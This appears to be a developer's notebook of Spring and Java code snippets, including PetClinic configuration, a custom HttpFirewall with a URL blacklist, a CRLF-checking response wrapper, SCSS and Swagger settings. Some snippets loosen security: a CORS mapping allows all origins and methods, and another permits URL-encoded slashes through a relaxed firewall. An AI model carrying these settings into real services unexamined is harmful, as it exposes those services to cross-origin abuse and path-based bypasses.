        return new Filter[]{characterEncodingFilter};
    }

}
--------------------------------------------------------------------------------------------------------
@EnableMBeanExport
import net.sf.ehcache.CacheManager;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.ehcache.EhCacheCacheManager;
import org.springframework.cache.ehcache.EhCacheManagerFactoryBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Description;
import org.springframework.context.annotation.EnableAspectJAutoProxy;
import org.springframework.context.annotation.EnableMBeanExport;
import org.springframework.core.io.ClassPathResource;
import org.springframework.samples.petclinic.util.CallMonitoringAspect;

@Configuration
@EnableCaching // enables scanning for @Cacheable annotation
@EnableMBeanExport
@EnableAspectJAutoProxy
public class ToolsConfig {
	
	@Bean
    @Description("Call monitoring aspect that monitors call count and call invocation time")
	public CallMonitoringAspect callMonitor() {
		return new CallMonitoringAspect();
	}
	
	@Bean
	@Autowired
	public EhCacheCacheManager ehCacheCacheManager(CacheManager cacheManager) {
		EhCacheCacheManager ehCacheCacheManager = new EhCacheCacheManager();
		ehCacheCacheManager.setCacheManager(cacheManager);
		return ehCacheCacheManager;
	}

	@Bean
	public EhCacheManagerFactoryBean cacheManager() {
		EhCacheManagerFactoryBean ehCacheManager = new EhCacheManagerFactoryBean();
		ehCacheManager.setConfigLocation(new ClassPathResource("cache/ehcache.xml"));
		return ehCacheManager;
	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Condition;
import org.springframework.context.annotation.ConditionContext;
import org.springframework.core.type.AnnotatedTypeMetadata;
import org.springframework.util.MultiValueMap;

/**
 * {@link Condition} that matches based on the value of a {@link NotProfile @NotProfile}
 * annotation.
 *
 */
class NotProfileCondition implements Condition {

	@Override
	public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
		if (context.getEnvironment() != null) {
			MultiValueMap<String, Object> attrs = metadata.getAllAnnotationAttributes(NotProfile.class.getName());
			if (attrs != null) {
				for (Object value : attrs.get("value")) {
					if (context.getEnvironment().acceptsProfiles(((String[]) value))) {
						return false;
					}
				}
				return true;
			}
		}
		return true;
	}
}

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import org.springframework.context.annotation.Conditional;


/**
 * Indicates that a component is eligible for registration when none of the {@linkplain
 * #value specified profiles} is active.
*/
@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.TYPE, ElementType.METHOD})
@Documented
@Conditional(NotProfileCondition.class)
public @interface NotProfile {
	
	/**
	 * The set of profiles for which the annotated component should not be registered.
	 */
	String[] value();
}


--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Description;
import org.springframework.oxm.Marshaller;
import org.springframework.oxm.jaxb.Jaxb2Marshaller;
import org.springframework.samples.petclinic.model.Vets;
import org.springframework.web.accept.ContentNegotiationManager;
import org.springframework.web.servlet.ViewResolver;
import org.springframework.web.servlet.view.BeanNameViewResolver;
import org.springframework.web.servlet.view.ContentNegotiatingViewResolver;
import org.springframework.web.servlet.view.InternalResourceViewResolver;
import org.springframework.web.servlet.view.JstlView;
import org.springframework.web.servlet.view.xml.MarshallingView;

import java.util.ArrayList;
import java.util.List;

@Configuration
public class MvcViewConfig {
	
	@Bean
	public ContentNegotiatingViewResolver contentNegotiatingViewResolver(ContentNegotiationManager manager) {
	 	ContentNegotiatingViewResolver contentNegotiatingViewResolver = new ContentNegotiatingViewResolver();
	 	List<ViewResolver> viewResolvers = new ArrayList<ViewResolver>();
	 	viewResolvers.add(internalResourceViewResolver());
	 	viewResolvers.add(beanNameViewResolver());
		contentNegotiatingViewResolver.setViewResolvers(viewResolvers );
		contentNegotiatingViewResolver.setContentNegotiationManager(manager);
		return contentNegotiatingViewResolver;
	}
	
	@Bean
	@Description("Default viewClass: JSTL view (JSP with html output)")
	public ViewResolver internalResourceViewResolver() {
		// Example: a logical view name of 'vets' is mapped to
		// '/WEB-INF/jsp/vets.jsp'
		InternalResourceViewResolver bean = new InternalResourceViewResolver();
		bean.setViewClass(JstlView.class);
		bean.setPrefix("/WEB-INF/jsp/");
		bean.setSuffix(".jsp");
		return bean;
	}

	@Bean
	@Description("Used for 'xml' views")
	public ViewResolver beanNameViewResolver() {
		return new BeanNameViewResolver();
	}

	@Bean(name = "vets/vetList.xml")
	@Description("Renders an XML view. Used by the BeanNameViewResolver")
	public MarshallingView marshallingView() {
		return new MarshallingView(marshaller());
	}

	@Bean
	@Description("Object-XML mapping declared using annotations inside 'Vets'")
	public Marshaller marshaller() {
		Jaxb2Marshaller marshaller = new Jaxb2Marshaller();
		marshaller.setClassesToBeBound(Vets.class);
		return marshaller;
	}

}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebMvc
@Import(MvcViewConfig.class)
// POJOs labeled with the @Controller and @Service annotations are
// auto-detected.
@ComponentScan(basePackages = { "org.springframework.samples.petclinic.web" })
public class MvcCoreConfig implements WebMvcConfigurer {

	@Autowired
	private ClinicService clinicService;

	@Override
	public void configureContentNegotiation(
			ContentNegotiationConfigurer configurer) {
		configurer.ignoreAcceptHeader(true);
		configurer.defaultContentType(MediaType.TEXT_HTML);
		configurer.mediaType("html", MediaType.TEXT_HTML);
		configurer.mediaType("xml", MediaType.APPLICATION_XML);
	}

	@Override
	public void configureDefaultServletHandling(
			DefaultServletHandlerConfigurer configurer) {
		// Serve static resources (*.html, ...) from src/main/webapp/
		configurer.enable();
	}

	@Override
	public void addFormatters(FormatterRegistry formatterRegistry) {
		formatterRegistry.addFormatter(petTypeFormatter());
	}

	@Bean
	public PetTypeFormatter petTypeFormatter() {
		return new PetTypeFormatter(clinicService);
	}

	@Override
	public void addResourceHandlers(ResourceHandlerRegistry registry) {
		// all resources inside folder src/main/webapp/resources are mapped so
		// they can be refered to inside JSP files (see header.jsp for more
		// details)
		registry.addResourceHandler("/resources/**").addResourceLocations(
				"/resources/");
		// uses WebJars so Javascript and CSS libs can be declared as Maven dependencies (Bootstrap, jQuery...)
		registry.addResourceHandler("/webjars/**").addResourceLocations(
				"classpath:/META-INF/resources/webjars/");
	}

    @Override
    public void addViewControllers(ViewControllerRegistry registry) {
        registry.addViewController("/").setViewName("welcome");
    }

	@Bean(name = "messageSource")
	@Description("Message source for this context, loaded from localized 'messages_xx' files.")
	public ReloadableResourceBundleMessageSource reloadableResourceBundleMessageSource() {
		// Files are stored inside src/main/resources
		ReloadableResourceBundleMessageSource messageSource = new ReloadableResourceBundleMessageSource();
		messageSource.setBasenames("classpath:messages/messages");
		return messageSource;
	}

	/**
	 * Resolves specific types of exceptions to corresponding logical view names
	 * for error views.
	 *
	 * <p>
	 * View name resolved using bean of type InternalResourceViewResolver
	 * (declared in {@link MvcViewConfig}).
	 */
	@Override
	public void configureHandlerExceptionResolvers(
			List<HandlerExceptionResolver> exceptionResolvers) {
		SimpleMappingExceptionResolver exceptionResolver = new SimpleMappingExceptionResolver();
		// results into 'WEB-INF/jsp/exception.jsp'
		exceptionResolver.setDefaultErrorView("exception");
		// needed otherwise exceptions won't be logged anywhere
		exceptionResolver.setWarnLogCategory("warn");
		exceptionResolvers.add(exceptionResolver);
	}

}
--------------------------------------------------------------------------------------------------------
import javax.sql.DataSource;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;
import org.springframework.jdbc.datasource.DataSourceTransactionManager;

@Configuration
@Profile("jdbc")
@ComponentScan("org.springframework.samples.petclinic.repository.jdbc")
public class JdbcConfig {
	
	@Autowired
	private DataSource dataSource;

    @Bean(name="transactionManager")
    public DataSourceTransactionManager dataSourceTransactionManager() {
    	return new DataSourceTransactionManager(dataSource);
    }
    
    @Bean
    public JdbcTemplate jdbcTemplate() {
    	return new JdbcTemplate(dataSource);
    }
    
    @Bean
    public NamedParameterJdbcTemplate namedParameterJdbcTemplate() {
    	return new NamedParameterJdbcTemplate(dataSource);
    }

}
--------------------------------------------------------------------------------------------------------
import javax.annotation.PostConstruct;
import javax.sql.DataSource;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.env.Environment;
import org.springframework.core.io.ClassPathResource;
import org.springframework.jdbc.datasource.init.DatabasePopulatorUtils;
import org.springframework.jdbc.datasource.init.ResourceDatabasePopulator;

@Configuration
public class InitDataSourceConfig {
	
	@Autowired
	private Environment env;
	
	@Autowired
	private DataSource dataSource;
	
	@PostConstruct
	public void init() {
		ResourceDatabasePopulator databasePopulator = new ResourceDatabasePopulator();
		databasePopulator.addScript(new ClassPathResource(env.getProperty("jdbc.initLocation")));
		databasePopulator.addScript(new ClassPathResource(env.getProperty("jdbc.dataLocation")));
		DatabasePopulatorUtils.execute(databasePopulator, dataSource);
	}
}

	@Bean(name = "dataSource")
	@Description("JNDI DataSource for JEE environments")
	@Profile("javaee")
	public JndiObjectFactoryBean jndiDataSource()
			throws IllegalArgumentException {
		JndiObjectFactoryBean dataSource = new JndiObjectFactoryBean();
		dataSource.setExpectedType(DataSource.class);
		dataSource.setJndiName(env.getProperty("java:comp/env/jdbc/petclinic"));
		return dataSource;
	}
--------------------------------------------------------------------------------------------------------
 @ModelAttribute("types")
    public Collection<PetType> populatePetTypes() {
        return this.clinicService.findPetTypes();
    }
--------------------------------------------------------------------------------------------------------
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.springframework.jmx.export.annotation.ManagedAttribute;
import org.springframework.jmx.export.annotation.ManagedOperation;
import org.springframework.jmx.export.annotation.ManagedResource;
import org.springframework.util.StopWatch;

/**
 * Simple aspect that monitors call count and call invocation time. It uses JMX annotations and therefore can be
 * monitored using any JMX console such as the jConsole
 * <p/>
 * This is only useful if you use JPA or JDBC.  Spring-data-jpa doesn't have any correctly annotated classes to join on
 *
 * @author Rob Harrop
 * @author Juergen Hoeller
 * @author Michael Isvy
 * @since 2.5
 */
@ManagedResource("petclinic:type=CallMonitor")
@Aspect
public class CallMonitoringAspect {

    private boolean enabled = true;

    private int callCount = 0;

    private long accumulatedCallTime = 0;

    @ManagedAttribute
    public boolean isEnabled() {
        return enabled;
    }

    @ManagedAttribute
    public void setEnabled(boolean enabled) {
        this.enabled = enabled;
    }

    @ManagedOperation
    public void reset() {
        this.callCount = 0;
        this.accumulatedCallTime = 0;
    }

    @ManagedAttribute
    public int getCallCount() {
        return callCount;
    }

    @ManagedAttribute
    public long getCallTime() {
        if (this.callCount > 0)
            return this.accumulatedCallTime / this.callCount;
        else
            return 0;
    }


    @Around("within(@org.springframework.stereotype.Repository *)")
    public Object invoke(ProceedingJoinPoint joinPoint) throws Throwable {
        if (this.enabled) {
            StopWatch sw = new StopWatch(joinPoint.toShortString());

            sw.start("invoke");
            try {
                return joinPoint.proceed();
            } finally {
                sw.stop();
                synchronized (this) {
                    this.callCount++;
                    this.accumulatedCallTime += sw.getTotalTimeMillis();
                }
            }
        } else {
            return joinPoint.proceed();
        }
    }

}
--------------------------------------------------------------------------------------------------------
public class PairAConverter extends
    ConversionServiceAwareConverter<Pair<ClassA, Param>, Response> {

public class PairBConverter extends
    ConversionServiceAwareConverter<Pair<ClassB, Param>, Response> {
--------------------------------------------------------------------------------------------------------
@Override
public void configure(WebSecurity web) throws Exception {
    //@formatter:off
    super.configure(web);
    web.httpFirewall(allowUrlEncodedSlashHttpFirewall());
....
}


@Bean
public HttpFirewall defaultHttpFirewall() {
    return new DefaultHttpFirewall();
}

 final Constructor<TypeDescriptor> constructor = TypeDescriptor.class.getConstructor(ResolvableType.class, Class.class, Annotation[].class);
        final ResolvableType resolvableType = ResolvableType.forClassWithGenerics(List.class, String.class);
        final TypeDescriptor toType = constructor.newInstance(resolvableType, List.class, null);
        final List<String> finalResponse = conversionService.<List<String>>convert(source, TypeDescriptor.valueOf(String.class), toType);
--------------------------------------------------------------------------------------------------------

import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.http.HttpMethod;
import org.springframework.security.web.firewall.DefaultHttpFirewall;
import org.springframework.security.web.firewall.FirewalledRequest;
import org.springframework.security.web.firewall.HttpFirewall;
import org.springframework.security.web.firewall.RequestRejectedException;

public class CustomStrictHttpFirewall implements HttpFirewall {
    private static final Set<String> ALLOW_ANY_HTTP_METHOD = Collections.unmodifiableSet(Collections.emptySet());

    private static final String ENCODED_PERCENT = "%25";

    private static final String PERCENT = "%";

    private static final List<String> FORBIDDEN_ENCODED_PERIOD = Collections.unmodifiableList(Arrays.asList("%2e", "%2E"));

    private static final List<String> FORBIDDEN_SEMICOLON = Collections.unmodifiableList(Arrays.asList(";", "%3b", "%3B"));

    private static final List<String> FORBIDDEN_FORWARDSLASH = Collections.unmodifiableList(Arrays.asList("%2f", "%2F"));

    private static final List<String> FORBIDDEN_BACKSLASH = Collections.unmodifiableList(Arrays.asList("\\", "%5c", "%5C"));

    private Set<String> encodedUrlBlacklist = new HashSet<String>();

    private Set<String> decodedUrlBlacklist = new HashSet<String>();

    private Set<String> allowedHttpMethods = createDefaultAllowedHttpMethods();

    public CustomStrictHttpFirewall() {
        urlBlacklistsAddAll(FORBIDDEN_SEMICOLON);
        urlBlacklistsAddAll(FORBIDDEN_FORWARDSLASH);
        urlBlacklistsAddAll(FORBIDDEN_BACKSLASH);

        this.encodedUrlBlacklist.add(ENCODED_PERCENT);
        this.encodedUrlBlacklist.addAll(FORBIDDEN_ENCODED_PERIOD);
        this.decodedUrlBlacklist.add(PERCENT);
    }

    public void setUnsafeAllowAnyHttpMethod(boolean unsafeAllowAnyHttpMethod) {
        this.allowedHttpMethods = unsafeAllowAnyHttpMethod ? ALLOW_ANY_HTTP_METHOD : createDefaultAllowedHttpMethods();
    }

    public void setAllowedHttpMethods(Collection<String> allowedHttpMethods) {
        if (allowedHttpMethods == null) {
            throw new IllegalArgumentException("allowedHttpMethods cannot be null");
        }
        if (allowedHttpMethods == ALLOW_ANY_HTTP_METHOD) {
            this.allowedHttpMethods = ALLOW_ANY_HTTP_METHOD;
        } else {
            this.allowedHttpMethods = new HashSet<>(allowedHttpMethods);
        }
    }

    public void setAllowSemicolon(boolean allowSemicolon) {
        if (allowSemicolon) {
            urlBlacklistsRemoveAll(FORBIDDEN_SEMICOLON);
        } else {
            urlBlacklistsAddAll(FORBIDDEN_SEMICOLON);
        }
    }

    public void setAllowUrlEncodedSlash(boolean allowUrlEncodedSlash) {
        if (allowUrlEncodedSlash) {
            urlBlacklistsRemoveAll(FORBIDDEN_FORWARDSLASH);
        } else {
            urlBlacklistsAddAll(FORBIDDEN_FORWARDSLASH);
        }
    }

    public void setAllowUrlEncodedPeriod(boolean allowUrlEncodedPeriod) {
        if (allowUrlEncodedPeriod) {
            this.encodedUrlBlacklist.removeAll(FORBIDDEN_ENCODED_PERIOD);
        } else {
            this.encodedUrlBlacklist.addAll(FORBIDDEN_ENCODED_PERIOD);
        }
    }

    public void setAllowBackSlash(boolean allowBackSlash) {
        if (allowBackSlash) {
            urlBlacklistsRemoveAll(FORBIDDEN_BACKSLASH);
        } else {
            urlBlacklistsAddAll(FORBIDDEN_BACKSLASH);
        }
    }

    public void setAllowUrlEncodedPercent(boolean allowUrlEncodedPercent) {
        if (allowUrlEncodedPercent) {
            this.encodedUrlBlacklist.remove(ENCODED_PERCENT);
            this.decodedUrlBlacklist.remove(PERCENT);
        } else {
            this.encodedUrlBlacklist.add(ENCODED_PERCENT);
            this.decodedUrlBlacklist.add(PERCENT);
        }
    }

    private void urlBlacklistsAddAll(Collection<String> values) {
        this.encodedUrlBlacklist.addAll(values);
        this.decodedUrlBlacklist.addAll(values);
    }

    private void urlBlacklistsRemoveAll(Collection<String> values) {
        this.encodedUrlBlacklist.removeAll(values);
        this.decodedUrlBlacklist.removeAll(values);
    }

    @Override
    public FirewalledRequest getFirewalledRequest(HttpServletRequest request) throws RequestRejectedException {
        rejectForbiddenHttpMethod(request);
        rejectedBlacklistedUrls(request);

        if (!isNormalized(request)) {
            request.setAttribute("isNormalized", new RequestRejectedException("The request was rejected because the URL was not normalized."));
        }

        String requestUri = request.getRequestURI();
        if (!containsOnlyPrintableAsciiCharacters(requestUri)) {
            request.setAttribute("isNormalized",  new RequestRejectedException("The requestURI was rejected because it can only contain printable ASCII characters."));
        }
        return new FirewalledRequest(request) {
            @Override
            public void reset() {
            }
        };
    }

    private void rejectForbiddenHttpMethod(HttpServletRequest request) {
        if (this.allowedHttpMethods == ALLOW_ANY_HTTP_METHOD) {
            return;
        }
        if (!this.allowedHttpMethods.contains(request.getMethod())) {
            request.setAttribute("isNormalized",  new RequestRejectedException("The request was rejected because the HTTP method \"" +
                    request.getMethod() +
                    "\" was not included within the whitelist " +
                    this.allowedHttpMethods));
        }
    }

    private void rejectedBlacklistedUrls(HttpServletRequest request) {
        for (String forbidden : this.encodedUrlBlacklist) {
            if (encodedUrlContains(request, forbidden)) {
                request.setAttribute("isNormalized",  new RequestRejectedException("The request was rejected because the URL contained a potentially malicious String \"" + forbidden + "\""));
            }
        }
        for (String forbidden : this.decodedUrlBlacklist) {
            if (decodedUrlContains(request, forbidden)) {
                request.setAttribute("isNormalized",  new RequestRejectedException("The request was rejected because the URL contained a potentially malicious String \"" + forbidden + "\""));
            }
        }
    }

    @Override
    public HttpServletResponse getFirewalledResponse(HttpServletResponse response) {
        return new FirewalledResponse(response);
    }

    private static Set<String> createDefaultAllowedHttpMethods() {
        Set<String> result = new HashSet<>();
        result.add(HttpMethod.DELETE.name());
        result.add(HttpMethod.GET.name());
        result.add(HttpMethod.HEAD.name());
        result.add(HttpMethod.OPTIONS.name());
        result.add(HttpMethod.PATCH.name());
        result.add(HttpMethod.POST.name());
        result.add(HttpMethod.PUT.name());
        return result;
    }

    private static boolean isNormalized(HttpServletRequest request) {
        if (!isNormalized(request.getRequestURI())) {
            return false;
        }
        if (!isNormalized(request.getContextPath())) {
            return false;
        }
        if (!isNormalized(request.getServletPath())) {
            return false;
        }
        if (!isNormalized(request.getPathInfo())) {
            return false;
        }
        return true;
    }

    private static boolean encodedUrlContains(HttpServletRequest request, String value) {
        if (valueContains(request.getContextPath(), value)) {
            return true;
        }
        return valueContains(request.getRequestURI(), value);
    }

    private static boolean decodedUrlContains(HttpServletRequest request, String value) {
        if (valueContains(request.getServletPath(), value)) {
            return true;
        }
        if (valueContains(request.getPathInfo(), value)) {
            return true;
        }
        return false;
    }

    private static boolean containsOnlyPrintableAsciiCharacters(String uri) {
        int length = uri.length();
        for (int i = 0; i < length; i++) {
            char c = uri.charAt(i);
            if (c < '\u0020' || c > '\u007e') {
                return false;
            }
        }

        return true;
    }

    private static boolean valueContains(String value, String contains) {
        return value != null && value.contains(contains);
    }

    private static boolean isNormalized(String path) {
        if (path == null) {
            return true;
        }

        if (path.indexOf("//") > -1) {
            return false;
        }

        for (int j = path.length(); j > 0;) {
            int i = path.lastIndexOf('/', j - 1);
            int gap = j - i;

            if (gap == 2 && path.charAt(i + 1) == '.') {
                // ".", "/./" or "/."
                return false;
            } else if (gap == 3 && path.charAt(i + 1) == '.' && path.charAt(i + 2) == '.') {
                return false;
            }

            j = i;
        }

        return true;
    }

}

STEP 2 : Create a FirewalledResponse class

package com.biz.brains.project.security.firewall;

import java.io.IOException;
import java.util.regex.Pattern;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletResponseWrapper;

class FirewalledResponse extends HttpServletResponseWrapper {
    private static final Pattern CR_OR_LF = Pattern.compile("\\r|\\n");
    private static final String LOCATION_HEADER = "Location";
    private static final String SET_COOKIE_HEADER = "Set-Cookie";

    public FirewalledResponse(HttpServletResponse response) {
        super(response);
    }

    @Override
    public void sendRedirect(String location) throws IOException {
        // TODO: implement pluggable validation, instead of simple blacklisting.
        // SEC-1790. Prevent redirects containing CRLF
        validateCrlf(LOCATION_HEADER, location);
        super.sendRedirect(location);
    }

    @Override
    public void setHeader(String name, String value) {
        validateCrlf(name, value);
        super.setHeader(name, value);
    }

    @Override
    public void addHeader(String name, String value) {
        validateCrlf(name, value);
        super.addHeader(name, value);
    }

    @Override
    public void addCookie(Cookie cookie) {
        if (cookie != null) {
            validateCrlf(SET_COOKIE_HEADER, cookie.getName());
            validateCrlf(SET_COOKIE_HEADER, cookie.getValue());
            validateCrlf(SET_COOKIE_HEADER, cookie.getPath());
            validateCrlf(SET_COOKIE_HEADER, cookie.getDomain());
            validateCrlf(SET_COOKIE_HEADER, cookie.getComment());
        }
        super.addCookie(cookie);
    }

    void validateCrlf(String name, String value) {
        if (hasCrlf(name) || hasCrlf(value)) {
            throw new IllegalArgumentException(
                    "Invalid characters (CR/LF) in header " + name);
        }
    }

    private boolean hasCrlf(String value) {
        return value != null && CR_OR_LF.matcher(value).find();
    }
}



import java.io.IOException;
import java.util.Objects;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.http.HttpHeaders;
import org.springframework.security.web.firewall.RequestRejectedException;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.GenericFilterBean;

import lombok.extern.slf4j.Slf4j;

@Component
@Slf4j
@Order(Ordered.HIGHEST_PRECEDENCE)
public class RequestRejectedExceptionFilter extends GenericFilterBean {

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            try {
                RequestRejectedException requestRejectedException=(RequestRejectedException) servletRequest.getAttribute("isNormalized");
                if(Objects.nonNull(requestRejectedException)) {
                    throw requestRejectedException;
                }else {
                    filterChain.doFilter(servletRequest, servletResponse);
                }
            } catch (RequestRejectedException requestRejectedException) {
                HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
                HttpServletResponse httpServletResponse = (HttpServletResponse) servletResponse;
                log
                    .error(
                            "request_rejected: remote={}, user_agent={}, request_url={}",
                            httpServletRequest.getRemoteHost(),  
                            httpServletRequest.getHeader(HttpHeaders.USER_AGENT),
                            httpServletRequest.getRequestURL(), 
                            requestRejectedException
                    );

                httpServletResponse.sendError(HttpServletResponse.SC_NOT_FOUND);
            }
        }
}

import java.io.IOException;
import java.util.regex.Pattern;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletResponseWrapper;

class FirewalledResponse extends HttpServletResponseWrapper {
    private static final Pattern CR_OR_LF = Pattern.compile("\\r|\\n");
    private static final String LOCATION_HEADER = "Location";
    private static final String SET_COOKIE_HEADER = "Set-Cookie";

    public FirewalledResponse(HttpServletResponse response) {
        super(response);
    }

    @Override
    public void sendRedirect(String location) throws IOException {
        // TODO: implement pluggable validation, instead of simple blacklisting.
        // SEC-1790. Prevent redirects containing CRLF
        validateCrlf(LOCATION_HEADER, location);
        super.sendRedirect(location);
    }

    @Override
    public void setHeader(String name, String value) {
        validateCrlf(name, value);
        super.setHeader(name, value);
    }

    @Override
    public void addHeader(String name, String value) {
        validateCrlf(name, value);
        super.addHeader(name, value);
    }

    @Override
    public void addCookie(Cookie cookie) {
        if (cookie != null) {
            validateCrlf(SET_COOKIE_HEADER, cookie.getName());
            validateCrlf(SET_COOKIE_HEADER, cookie.getValue());
            validateCrlf(SET_COOKIE_HEADER, cookie.getPath());
            validateCrlf(SET_COOKIE_HEADER, cookie.getDomain());
            validateCrlf(SET_COOKIE_HEADER, cookie.getComment());
        }
        super.addCookie(cookie);
    }

    void validateCrlf(String name, String value) {
        if (hasCrlf(name) || hasCrlf(value)) {
            throw new IllegalArgumentException(
                    "Invalid characters (CR/LF) in header " + name);
        }
    }

    private boolean hasCrlf(String value) {
        return value != null && CR_OR_LF.matcher(value).find();
    }
}

@Override
protected void configure(HttpSecurity http) throws Exception {
     http.addFilterBefore(new RequestRejectedExceptionFilter(),
             ChannelProcessingFilter.class);
}
--------------------------------------------------------------------------------------------------------
@media screen and (min-width: $viewport-small) {
  html {
    font-size: 16px;
  }

  h1,
  .h1 {
    font-size: $h1;
  }

  .site-header {
    text-align: left;
  }

  .site-nav {
    margin-top: 0;
  }

  .site-header a {
    font-size: $h4;
  }

  .site-header .site-title {
    font-size: $h3;
    float: left;
  }

  .site-header .site-nav {
    float: right;
    margin-top: .25rem;
  }

  blockquote {
    margin-left: $space-3;
    padding: $space-3;
  }

  .social-icons-left {
    text-align: left;
  }

  .social-icons-right {
    text-align: right;
  }
}

@media screen and (min-width: $viewport-medium) {
  html {
    font-size: 18px;
  }
}

@media screen and (min-width: $viewport-large) {
  html {
    font-size: 20px;
  }
}

@media screen and (min-width: $viewport-large + 14) {
  em img {
    max-width: $measure-width + 14;
    margin-left: -7em;
  }
}
--------------------------------------------------------------------------------------------------------
input,
select,
textarea,
fieldset {
  font-size: $form-field-font-size;
  margin-top: 0;
  margin-bottom: $space-1;
}

input[type=text],
input[type=datetime],
input[type=datetime-local],
input[type=email],
input[type=month],
input[type=number],
input[type=password],
input[type=search],
input[type=tel],
input[type=time],
input[type=url],
input[type=week] {
  box-sizing: border-box;
  height: $form-field-height;
  padding: $form-field-padding-y $form-field-padding-x;
  vertical-align: middle;
  -webkit-appearance: none;
}

select {
  box-sizing: border-box;
  line-height: 1.75;
  padding: $form-field-padding-y $form-field-padding-x;
}

select:not([multiple]) {
  height: $form-field-height;
  vertical-align: middle;
}

textarea {
  box-sizing: border-box;
  line-height: 1.75;
  padding: $form-field-padding-y $form-field-padding-x;
}

.form-stacked input,
.form-stacked textarea,
.form-stacked select {
  width: 100%;
}

.field-light {
  background-color: white;
  transition: box-shadow .2s ease;
  border-style: solid;
  border-width: $border-width;
  border-color: $border-color;
  border-radius: $border-radius;
}

.field-light:focus {
  outline: none;
  border-color: $blue;
  box-shadow: 0 0 2px rgba($blue,.5);
}

.field-light:disabled {
  color: $mid-gray;
  background-color: $darken-2;
}

.field-light:read-only:not(select) {
  background-color: $darken-2;
}

.field-light:invalid {
  border-color: $red;
}

.field-light.is-success {
  border-color: $green;
}

.field-light.is-warning {
  border-color: $yellow;
}

.field-light.is-error {
  border-color: $red;
}


.radio-light,
.checkbox-light {
  transition: box-shadow .2s ease;
}

.radio-light {
  border-radius: 50%;
}

.radio-light:focus,
.checkbox-light:focus {
  outline: none;
  box-shadow: 0 0 2px rgba($blue, .5);
}
--------------------------------------------------------------------------------------------------------
.clearfix:before, .clearfix:after {
  content: ' ';
  display: table;
}

.clearfix:after {
  clear: both;
}
https://basscss.com/
https://daneden.github.io/animate.css/
--------------------------------------------------------------------------------------------------------
    @Bean
    public UiConfiguration uiConfig() {
        return UiConfigurationBuilder.builder()
                .deepLinking(swaggerProperty.isDeepLinking())
                .displayOperationId(swaggerProperty.isDisplayOperationId())
                .defaultModelsExpandDepth(swaggerProperty.getDefaultModelsExpandDepth())
                .defaultModelExpandDepth(swaggerProperty.getDefaultModelExpandDepth())
                .defaultModelRendering(ModelRendering.EXAMPLE)
                .displayRequestDuration(swaggerProperty.isDisplayRequestDuration())
                .docExpansion(DocExpansion.NONE)
                .filter(swaggerProperty.isFilter())
                .maxDisplayedTags(swaggerProperty.getMaxDisplayedTags())
                .operationsSorter(OperationsSorter.ALPHA)
                .showExtensions(swaggerProperty.isShowExtensions())
                .tagsSorter(TagsSorter.ALPHA)
                .supportedSubmitMethods(UiConfiguration.Constants.DEFAULT_SUBMIT_METHODS)
                .validatorUrl(null)
                .build();
    }
--------------------------------------------------------------------------------------------------------
String ext1 = FilenameUtils.getExtension("/path/to/file/foo.txt"); // returns "txt"
String ext2 = FilenameUtils.getExtension("bar.exe"); // returns "exe"

String ext = Files.getFileExtension(path);
String filename = Files.getNameWithoutExtension(path);
--------------------------------------------------------------------------------------------------------
//import javax.sql.DataSource;
//
//import org.springframework.cloud.Cloud;
//import org.springframework.cloud.CloudFactory;
//import org.springframework.context.annotation.Bean;
//import org.springframework.context.annotation.Configuration;
//import org.springframework.context.annotation.Profile;

//@Configuration
//@Profile("cloud")
//public  class CloudFoundryDatabaseConfig {
// 
//    @Bean
//    public Cloud cloud() {
//        return new CloudFactory().getCloud();
//    }
// 
//    @Bean
//    public DataSource dataSource() {
//        DataSource dataSource = 
//        		cloud().getServiceConnector("todo-database", DataSource.class, null);
//        //Customized
//        return dataSource;
//    }
//}
--------------------------------------------------------------------------------------------------------

	@Bean
	public WebMvcConfigurer corsConfigurer() {
		return new WebMvcConfigurer() {
			@Override
			public void addCorsMappings(CorsRegistry registry) {
				registry.addMapping("/**").allowedMethods("*").allowedOrigins("*");
			}
		};
	}
--------------------------------------------------------------------------------------------------------
    @Id
    @Column(name = "ID")
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "user_seq")
    @SequenceGenerator(name = "user_seq", sequenceName = "user_seq", allocationSize = 1)
    private Long id;
	
	//@CrossOrigin(origins="http://localhost:4200")Replace with global config
--------------------------------------------------------------------------------------------------------
@RequestHeader Map<String, String> headers
--------------------------------------------------------------------------------------------------------
mvn package spring-boot:repackage
--------------------------------------------------------------------------------------------------------
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class HomeController {
    @RequestMapping("/")
